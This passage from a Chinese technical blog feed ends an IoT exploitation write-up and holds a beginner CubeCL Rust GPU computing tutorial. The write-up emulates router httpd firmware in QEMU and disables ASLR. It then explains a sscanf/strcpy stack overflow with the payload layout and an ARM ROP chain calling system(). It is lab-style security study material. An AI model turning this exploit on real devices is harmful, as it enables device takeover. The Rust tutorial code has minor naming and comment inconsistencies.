vmlinuz-3.2.0-4-vexpress \</span><br><span class="line">-initrd initrd.img-3.2.0-4-vexpress \</span><br><span class="line">-drive if=sd,file=debian_wheezy_armhf_standard.qcow2 \</span><br><span class="line">-append &quot;root=/dev/mmcblk0p2 console=ttyAMA0&quot; \</span><br><span class="line">-net nic -net tap,ifname=tap0,script=no,downscript=no \</span><br><span class="line">-nographic   -audio none</span><br></pre></td></tr></table></figure><p>虚拟机设置eth0网络环境</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig eth0 192.168.117.76/24 up</span><br></pre></td></tr></table></figure><p>主机上传文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp -r ./squashfs-root root@192.168.117.76:/root</span><br></pre></td></tr></table></figure><p>启动服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mount -t proc /proc ./squashfs-root/proc</span><br><span class="line">mount -o bind /dev ./squashfs-root/dev</span><br><span class="line">chroot ./squashfs-root/ sh</span><br><span class="line"></span><br><span class="line">brctl addbr br0    #添加br0虚拟网卡</span><br><span class="line">ifconfig br0 192.168.117.76/24 up</span><br><span class="line"></span><br><span class="line"># 修复页面显示问题</span><br><span class="line">cp -rf ./webroot_ro/* ./webroot/</span><br><span class="line"></span><br><span class="line">echo 0 &gt; /proc/sys/kernel/randomize_va_space    #关闭地址随机化</span><br><span class="line">./bin/httpd</span><br></pre></td></tr></table></figure><h2 id="执行-1"><a href="#执行-1" class="headerlink" title="执行"></a>执行</h2><p>将poc.py中的url替换成你的url，检查libc地址是否一致后可执行</p><h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><h2 id="溢出点-1"><a href="#溢出点-1" class="headerlink" title="溢出点"></a>溢出点</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">  v1 = (_BYTE *)sscanf(v15 + 1, &quot;%[^:]:%s&quot;, nptr, v6);</span><br><span class="line">  if ( v1 == (_BYTE *)2 )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( *v15 == &#x27;-&#x27; )</span><br><span class="line">      v20 = 0xC - atoi(nptr);</span><br><span class="line">    else</span><br><span class="line">      v20 = atoi(nptr) + 0xC;</span><br><span class="line">    sprintf(v8, &quot;%d&quot;, v20);</span><br><span class="line">    strcpy(v7, v6);</span><br><span class="line">    SetValue(&quot;sys.timezone&quot;, v8);</span><br><span class="line">    v1 = (_BYTE *)SetValue(&quot;sys.timenextzone&quot;, v7);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;%[^:]:%s&quot;</span><br></pre></td></tr></table></figure><p>并不存在过滤，所以可以捕获过长的字符串进行溢出，但需要考虑要使得v1 ！&#x3D;2，避免多余的strcpy，因为处理不当会出现构造的rop出现错误，所以要构造以下格式的数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;a&quot;*(offset+1) + payload +&quot;: \n&quot;</span><br></pre></td></tr></table></figure><p>offset+1是为了满足sscanf从v15+1读取的原因</p><h3 id="执行gadget构造-1"><a href="#执行gadget构造-1" class="headerlink" title="执行gadget构造"></a>执行gadget构造</h3><p>定位system，想办法控制到R0，寻找符合条件的文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary httpd --only r3|ret</span><br></pre></td></tr></table></figure><p>构造payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload+= p32(pop_r3_pc) + p32(system) + p32(mov_r0_SP_ldr_r3) + cmd</span><br></pre></td></tr></table></figure><p>执行pop_r3_pc时，将system的地址设置为r3，将mov_r0_SP_ldr_r3的地址放入pc寄存器，也就是运行mov_r0_SP_ldr_r3处代码。</p><p>执行mov_r0_SP_ldr_r3，将sp（cmd命令地址）放入r0，跳转运行r3地址处，也就是刚刚放入r3的system</p><h2 id="运行结果-1"><a href="#运行结果-1" class="headerlink" title="运行结果"></a>运行结果</h2><p>成功打印<code>success_pwn_it</code></p><p><img src="https://www.helloimg.com/i/2025/06/09/684694e018e59.png" alt="1.png"></p>]]></content>
      
      
      <categories>
          
          <category> iot </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>rust-cubecl实现gpu开发</title>
      <link href="/2025/04/08/rust-cubecl%E5%AE%9E%E7%8E%B0gpu%E5%BC%80%E5%8F%91/"/>
      <url>/2025/04/08/rust-cubecl%E5%AE%9E%E7%8E%B0gpu%E5%BC%80%E5%8F%91/</url>
      
        <content type="html"><![CDATA[<h1 id="CubeCL-Rust-GPU计算教程"><a href="#CubeCL-Rust-GPU计算教程" class="headerlink" title="CubeCL Rust GPU计算教程"></a>CubeCL Rust GPU计算教程</h1><p>新手也能学会的高性能开发，只需要rust和cubel基础知识即可实现！</p><p>CubeCL是一个现代化的Rust GPU计算框架，它让编写高性能、可移植的GPU内核变得简单。通过CubeCL，你可以：</p><ul><li>使用熟悉的Rust语法编写GPU代码</li><li>无需深入掌握复杂的GPU编程知识</li><li>轻松切换不同后端(WGPU&#x2F;CUDA等)</li><li>自动优化SIMD并行计算</li></ul><h2 id="为什么选择CubeCL"><a href="#为什么选择CubeCL" class="headerlink" title="为什么选择CubeCL?"></a>为什么选择CubeCL?</h2><ol><li><strong>简单易用</strong>：用Rust写GPU代码，学习曲线平缓</li><li><strong>高性能</strong>：自动向量化优化，充分利用GPU算力  </li><li><strong>可移植</strong>：同一份代码可运行在WGPU&#x2F;CUDA等不同后端</li><li><strong>类型安全</strong>：Rust的类型系统保证代码安全性</li></ol><blockquote><p>提示：即使没有GPU编程经验，通过本教程你也能快速上手CubeCL！</p></blockquote><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>配置CubeCL非常简单，只需在Cargo.toml中添加依赖：</p><figure class="highlight toml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[dependencies]</span></span><br><span class="line"><span class="attr">cubecl</span> = &#123; version = <span class="string">&quot;0.4.0&quot;</span>, features = [<span class="string">&quot;wgpu&quot;</span>,<span class="string">&quot;default&quot;</span>,<span class="string">&quot;std&quot;</span>] &#125;</span><br></pre></td></tr></table></figure><h3 id="功能说明："><a href="#功能说明：" class="headerlink" title="功能说明："></a>功能说明：</h3><ul><li><code>wgpu</code>：使用WGPU后端(跨平台)</li><li><code>std</code>：启用标准库支持</li></ul><blockquote><p>小贴士：开发时建议同时启用wgpu和cuda特性，这样可以灵活切换后端测试</p></blockquote><figure class="highlight toml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[dependencies]</span></span><br><span class="line"><span class="attr">cubecl</span> = &#123; version = <span class="string">&quot;0.4.0&quot;</span>,features = [<span class="string">&quot;wgpu&quot;</span>,<span class="string">&quot;cuda&quot;</span>,<span class="string">&quot;default&quot;</span>,<span class="string">&quot;std&quot;</span>] &#125;</span><br></pre></td></tr></table></figure><h2 id="第一个GPU程序"><a href="#第一个GPU程序" class="headerlink" title="第一个GPU程序"></a>第一个GPU程序</h2><p>让我们从一个简单的GPU计算程序开始。虽然初看可能有些复杂，但我们会逐步解析每个部分。</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> cubecl::prelude::*;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[cube(launch)]</span>  <span class="comment">// 标记为可启动的GPU内核入口函数</span></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">gelu_array</span>&lt;F: Float&gt;(input: &amp;Array&lt;Line&lt;F&gt;&gt;, output: &amp;<span class="keyword">mut</span> Array&lt;Line&lt;F&gt;&gt;) &#123;</span><br><span class="line">    <span class="comment">// ABSOLUTE_POS_X是自动生成的线程索引</span></span><br><span class="line">    <span class="keyword">if</span> ABSOLUTE_POS_X &lt; input.<span class="title function_ invoke__">len</span>() &#123;  <span class="comment">// 边界检查</span></span><br><span class="line">        <span class="comment">// 对每个元素应用gelu_scalar激活函数</span></span><br><span class="line">        output[ABSOLUTE_POS_X] = <span class="title function_ invoke__">gelu_scalar</span>(input[ABSOLUTE_POS_X]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[cube]</span>  <span class="comment">// 标记为GPU函数</span></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">gelu_scalar</span>&lt;F: Float&gt;(x: Line&lt;F&gt;) <span class="punctuation">-&gt;</span> Line&lt;F&gt; &#123;</span><br><span class="line">    <span class="title function_ invoke__">add</span>(x, x/<span class="number">2.0</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[cube]</span>  <span class="comment">// 标记为GPU函数</span></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">add</span>&lt;F:Float&gt;(a:Line&lt;F&gt;, b:Line&lt;F&gt;) <span class="punctuation">-&gt;</span> Line&lt;F&gt; &#123;</span><br><span class="line">    a + b  <span class="comment">// 向量化加法</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">lanch_test</span>&lt;R: Runtime&gt;(device: &amp;R::Device) &#123;</span><br><span class="line">    <span class="comment">// 创建与GPU设备的连接</span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">client</span> = R::<span class="title function_ invoke__">client</span>(device);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 准备测试数据: 4096个5.0f32</span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">input</span> = &amp;[<span class="number">5f32</span>;<span class="number">8</span>];</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">vectorization</span> = <span class="number">4</span>;  <span class="comment">// 向量化宽度</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 分配GPU内存</span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">output_handle</span> = client.<span class="title function_ invoke__">empty</span>(input.<span class="title function_ invoke__">len</span>() * core::mem::size_of::&lt;<span class="type">f32</span>&gt;());</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">input_handle</span> = client.<span class="title function_ invoke__">create</span>(<span class="type">f32</span>::<span class="title function_ invoke__">as_bytes</span>(input));</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">unsafe</span> &#123;</span><br><span class="line">        <span class="comment">// 启动GPU内核</span></span><br><span class="line">        gelu_array::launch::&lt;<span class="type">f32</span>, R&gt;(</span><br><span class="line">            &amp;client,  <span class="comment">// GPU客户端</span></span><br><span class="line">            CubeCount::<span class="title function_ invoke__">Static</span>(<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>),  <span class="comment">// 1个Hyper-Cube</span></span><br><span class="line">            CubeDim::<span class="title function_ invoke__">new</span>(</span><br><span class="line">                <span class="number">2</span>,  <span class="comment">// X维度</span></span><br><span class="line">                <span class="number">1</span>,  <span class="comment">// Y维度</span></span><br><span class="line">                <span class="number">1</span>   <span class="comment">// Z维度</span></span><br><span class="line">            ),</span><br><span class="line">            ArrayArg::from_raw_parts::&lt;<span class="type">f32</span>&gt;(&amp;input_handle, input.<span class="title function_ invoke__">len</span>(), vectorization <span class="keyword">as</span> <span class="type">u8</span>),</span><br><span class="line">            ArrayArg::from_raw_parts::&lt;<span class="type">f32</span>&gt;(&amp;output_handle, input.<span class="title function_ invoke__">len</span>(), vectorization <span class="keyword">as</span> <span class="type">u8</span>),</span><br><span class="line">        )</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 读取结果</span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">bytes</span> = client.<span class="title function_ invoke__">read_one</span>(output_handle.<span class="title function_ invoke__">binding</span>());</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">output</span> = <span class="type">f32</span>::<span class="title function_ invoke__">from_bytes</span>(&amp;bytes);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;GPU计算结果(Runtime: &#123;:?&#125;) =&gt; &#123;:?&#125;&quot;</span>, R::<span class="title function_ invoke__">name</span>(), output);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">type</span> <span class="title class_">Runtime</span> = cubecl::wgpu::WgpuRuntime;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">device</span> = <span class="built_in">Default</span>::<span class="title function_ invoke__">default</span>();</span><br><span class="line">    launch_test::&lt;Runtime&gt;(&amp;device);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>虽然这段代码初看有些复杂，但CubeCL的设计实际上隐藏了许多GPU编程的复杂性。让我们分解理解每个部分：</p><h2 id="核心概念解析"><a href="#核心概念解析" class="headerlink" title="核心概念解析"></a>核心概念解析</h2><h3 id="1-Runtime-运行时"><a href="#1-Runtime-运行时" class="headerlink" title="1. Runtime(运行时)"></a>1. Runtime(运行时)</h3><p>Runtime是CubeCL的核心概念之一，它决定了你的代码将在哪种GPU后端上运行：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">Runtime</span> = cubecl::wgpu::WgpuRuntime;</span><br></pre></td></tr></table></figure><p>在cubecl中，runtime代表了我们的gpu运算将基于什么去运行，这里我选择的是wgpu，同理，我们也可以将他换成为cuda。</p><h3 id="2-Device-设备"><a href="#2-Device-设备" class="headerlink" title="2. Device(设备)"></a>2. Device(设备)</h3><p>Device代表实际的运算硬件。现代计算机可能有：</p><ul><li>独立显卡(Discrete GPU)</li><li>集成显卡(Integrated GPU) </li><li>CPU(作为后备)</li><li>虚拟GPU(如云环境)</li></ul><p>CubeCL支持灵活选择设备：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">device</span> = WgpuDevice::Cpu;</span><br></pre></td></tr></table></figure><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">device</span> = WgpuDevice::<span class="title function_ invoke__">DiscreteGpu</span>(<span class="number">0</span>);<span class="comment">// 独立gpu 参数为显卡在系统中的序号</span></span><br></pre></td></tr></table></figure><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">device</span> = WgpuDevice::<span class="title function_ invoke__">IntegratedGpu</span>(<span class="number">0</span>);<span class="comment">// 集成gpu 参数为显卡在系统中的序号</span></span><br></pre></td></tr></table></figure><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">device</span> = WgpuDevice::<span class="title function_ invoke__">VirtualGpu</span>(<span class="number">0</span>);<span class="comment">// 虚拟gpu 参数为显卡在系统中的序号</span></span><br></pre></td></tr></table></figure><h3 id="3-Client-客户端"><a href="#3-Client-客户端" class="headerlink" title="3. Client(客户端)"></a>3. Client(客户端)</h3><p>Client是连接CPU和GPU的桥梁，主要功能包括：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">client</span> = R::<span class="title function_ invoke__">client</span>(device);</span><br></pre></td></tr></table></figure><p><code>client</code> 是 GPU 运行时（如 CUDA 或 OpenCL）的<strong>高层抽象</strong>，封装了以下功能：</p><ul><li><strong>内存管理</strong>：分配&#x2F;释放 GPU 显存（如 <code>client.create()</code> 和 <code>client.empty()</code>）。</li><li><strong>数据传输</strong>：在 CPU 内存和 GPU 显存之间拷贝数据（如 <code>client.read_one()</code>）。</li><li><strong>内核执行</strong>：提交 GPU 内核（Kernel）启动命令到设备队列。</li></ul><p>其中</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">R::<span class="title function_ invoke__">client</span>(device)创建与指定GPU设备（device）绑定的运行时客户端。</span><br><span class="line">client.<span class="title function_ invoke__">create</span>(data)将CPU数据（data）拷贝到GPU显存，返回显存句柄（input_handle）。</span><br><span class="line">client.<span class="title function_ invoke__">empty</span>(size)在GPU显存中分配未初始化的空间（大小为size字节），返回句柄。</span><br><span class="line">client.<span class="title function_ invoke__">read_one</span>(handle)将GPU显存中的数据（通过handle标识）读回CPU内存。</span><br><span class="line">gelu_array::<span class="title function_ invoke__">launch</span>(client, ...)通过client提交内核执行任务到GPU队列。</span><br></pre></td></tr></table></figure><p>可以说**<code>client</code> 是GPU编程的入口**，它负责连接设备、管理数据、执行任务。</p><h2 id="GPU内核编程"><a href="#GPU内核编程" class="headerlink" title="GPU内核编程"></a>GPU内核编程</h2><p>与传统GPU编程不同，CubeCL允许直接用Rust编写运算逻辑。关键点是<code>#[cube]</code>宏：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#[cube]</span></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">add</span>&lt;F:Float&gt;(a:Line&lt;F&gt;, b:Line&lt;F&gt;) <span class="punctuation">-&gt;</span> Line&lt;F&gt; &#123;</span><br><span class="line">    a + b  <span class="comment">// 这个加法运算将在GPU上执行！</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="核心特点："><a href="#核心特点：" class="headerlink" title="核心特点："></a>核心特点：</h3><ol><li>使用Rust语法，无需学习新语言</li><li><code>Line&lt;T&gt;</code>类型表示可向量化数据</li><li>自动生成优化的GPU代码</li></ol><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#[cube(launch)]</span></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">gelu_array</span>&lt;F: Float&gt;(input: &amp;Array&lt;Line&lt;F&gt;&gt;, output: &amp;<span class="keyword">mut</span> Array&lt;Line&lt;F&gt;&gt;) &#123;</span><br><span class="line">    <span class="keyword">if</span> ABSOLUTE_POS&lt; input.<span class="title function_ invoke__">len</span>() &#123;</span><br><span class="line">        output[ABSOLUTE_POS] = <span class="title function_ invoke__">gelu_scalar</span>(input[ABSOLUTE_POS_X]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[cube]</span></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">gelu_scalar</span>&lt;F: Float&gt;(x: Line&lt;F&gt;) <span class="punctuation">-&gt;</span> Line&lt;F&gt; &#123;</span><br><span class="line">    <span class="comment">// Execute the sqrt function at comptime.</span></span><br><span class="line">    <span class="title function_ invoke__">add</span>(x,x/<span class="number">2.0</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#[cube]</span></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">add</span>&lt;F:Float&gt;(a:Line&lt;F&gt;, b:Line&lt;F&gt;) <span class="punctuation">-&gt;</span> Line&lt;F&gt; &#123;</span><br><span class="line">    a+b</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="cube-宏详解"><a href="#cube-宏详解" class="headerlink" title="#[cube]宏详解"></a><code>#[cube]</code>宏详解</h3><p><code>#[cube]</code>宏标记的函数将在GPU上执行，支持多种变体：</p><table><thead><tr><th>宏变体</th><th>用途</th></tr></thead><tbody><tr><td><code>#[cube]</code></td><td>基本GPU函数</td></tr><tr><td><code>#[cube(launch)]</code></td><td>生成可启动的内核入口函数</td></tr><tr><td><code>#[cube(debug)]</code></td><td>调试模式，打印生成代码</td></tr></tbody></table><p>在这个“入口”函数中，我们是如下定义的</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#[cube(launch)]</span></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">gelu_array</span>&lt;F: Float&gt;(input: &amp;Array&lt;Line&lt;F&gt;&gt;, output: &amp;<span class="keyword">mut</span> Array&lt;Line&lt;F&gt;&gt;) </span><br></pre></td></tr></table></figure><p>官方是这么描述line的，我们的数据就从这里进入。</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// A [Line] represents a contiguous series of elements where SIMD operations may be available.</span></span><br><span class="line"><span class="comment">/// The runtime will automatically use SIMD instructions when possible for improved performance.</span></span><br></pre></td></tr></table></figure><p>正常情况下，使用launch去创建一个“入口”，之后我们就可以调用 <code>函数名::launch</code>了，如下</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gelu_array::launch::&lt;<span class="type">f32</span>, R&gt;(</span><br><span class="line">     &amp;client,</span><br><span class="line">            CubeCount::<span class="title function_ invoke__">Static</span>(<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>),</span><br><span class="line">            CubeDim::<span class="title function_ invoke__">new</span>(<span class="number">2u32</span>, <span class="number">1u32</span>, <span class="number">1u32</span>),</span><br><span class="line">            ArrayArg::from_raw_parts::&lt;<span class="type">f32</span>&gt;(&amp;input_handle, input.<span class="title function_ invoke__">len</span>(), vectorization <span class="keyword">as</span> <span class="type">u8</span>),</span><br><span class="line">            ArrayArg::from_raw_parts::&lt;<span class="type">f32</span>&gt;(&amp;output_handle, input.<span class="title function_ invoke__">len</span>(), vectorization <span class="keyword">as</span> <span class="type">u8</span>),</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>我们发现这里比我们设定的参数多了好多东西，最开始所传入的就是我们所生成的client，也就是调用gpu的那个接口，接下来的东西比较多，我们需要慢慢解释。</p><h2 id="GPU并行模型"><a href="#GPU并行模型" class="headerlink" title="GPU并行模型"></a>GPU并行模型</h2><p>CubeCL使用独特的”多维立方体”模型管理GPU并行：</p><ol><li><strong>Hyper-Cube</strong>：顶层并行单元，由<code>CubeCount::Static</code>定义数量</li><li><strong>Cube</strong>：中层并行单元，由<code>CubeDim::new</code>定义尺寸</li><li><strong>Unit</strong>：基础执行单元，包含向量化数据</li></ol><p>这种抽象让并行计算更直观，Hyper-Cube又由Cube构成：</p><p><img src="https://www.helloimg.com/i/2025/04/08/67f520c7cb8d9.png" alt="image1"></p><p>Cube由unit构成</p><p><img src="https://www.helloimg.com/i/2025/04/08/67f520c825a53.png" alt="https://www.helloimg.com/i/2025/04/08/67f520c825a53.png"></p><p>最小单元就是unit每个unit中可以存放的数据量就是vectorization，当然这个也可以理解为一个uint的线程数。</p><p><img src="https://www.helloimg.com/i/2025/04/08/67f520c5447de.png" alt="https://www.helloimg.com/i/2025/04/08/67f520c5447de.png"></p><h3 id="启动配置示例"><a href="#启动配置示例" class="headerlink" title="启动配置示例"></a>启动配置示例</h3><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gelu_array::launch::&lt;<span class="type">f32</span>, R&gt;(</span><br><span class="line">    &amp;client,</span><br><span class="line">    CubeCount::<span class="title function_ invoke__">Static</span>(<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>),  <span class="comment">// 1个Hyper-Cube</span></span><br><span class="line">    CubeDim::<span class="title function_ invoke__">new</span>(<span class="number">2</span>, <span class="number">1</span>, <span class="number">1</span>),       <span class="comment">// 每个Cube是2x1x1</span></span><br><span class="line">    input_arg,                   <span class="comment">// 输入数据</span></span><br><span class="line">    output_arg,                  <span class="comment">// 输出缓冲区</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>这个配置表示：</p><ul><li>总计算量：8个元素(4向量宽度 × 2 × 1 × 1)</li><li>完美匹配数组长度时性能最佳</li></ul><h2 id="性能计算技巧"><a href="#性能计算技巧" class="headerlink" title="性能计算技巧"></a>性能计算技巧</h2><p>合理配置可以最大化GPU利用率：</p><ol><li><p><strong>总量计算</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">总元素 = 向量宽度 × (Cube.x × Cube.y × Cube.z) × (HyperCube.x × HyperCube.y × HyperCube.z)</span><br></pre></td></tr></table></figure></li><li><p><strong>X轴计算</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X轴元素 = 向量宽度 × Cube.x × HyperCube.x</span><br></pre></td></tr></table></figure></li><li><p><strong>最佳实践</strong>：</p><ul><li>使总元素数略大于实际数据量</li><li>优先扩展X轴维度</li><li>保持向量宽度为4或8的倍数</li></ul></li></ol><p>至于为什么要计算这个，我们还要先回到运算逻辑代码处，我们先说明这段代码的作用</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#[cube(launch)]</span></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">gelu_array</span>&lt;F: Float&gt;(input: &amp;Array&lt;Line&lt;F&gt;&gt;, output: &amp;<span class="keyword">mut</span> Array&lt;Line&lt;F&gt;&gt;) &#123;</span><br><span class="line">    <span class="keyword">if</span> ABSOLUTE_POS&lt; input.<span class="title function_ invoke__">len</span>() &#123;</span><br><span class="line">        output[ABSOLUTE_POS] = <span class="title function_ invoke__">gelu_scalar</span>(input[ABSOLUTE_POS]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里虽然并没有出现for循环，但我们可以理解再这个函数内部是不断循环的，其中ABSOLUTE_POS就是不断遍历的下标，去执行我们定义的函数。同理下面这个是只遍历x轴上的unit，将每个x轴上的unit进行gelu_scalar函数处理，进行单列运算</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#[cube(launch)]</span></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">gelu_array</span>&lt;F: Float&gt;(input: &amp;Array&lt;Line&lt;F&gt;&gt;, output: &amp;<span class="keyword">mut</span> Array&lt;Line&lt;F&gt;&gt;) &#123;</span><br><span class="line">    <span class="keyword">if</span> ABSOLUTE_POS_X &lt; input.<span class="title function_ invoke__">len</span>() &#123;</span><br><span class="line">        output[ABSOLUTE_POS_X] = <span 